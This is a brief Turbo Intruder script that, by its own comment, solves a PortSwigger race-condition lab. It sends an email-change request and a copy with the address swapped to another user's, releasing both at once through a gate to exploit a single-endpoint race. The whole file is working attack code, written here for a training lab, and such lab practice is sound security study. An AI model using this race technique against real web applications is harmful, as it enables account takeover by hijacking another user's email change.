# Solving the following lab with Turbo Intruder, instead of Repeater. 
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    someReq = target.req
    forReplace = someReq.split('email=')[1].split('&')[0]
    someReq = someReq.replace(forReplace,"carlos%40ginandjuice.shop")
    engine.queue(target.req,gate='race1')
    engine.queue(someReq,gate='race1')

    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
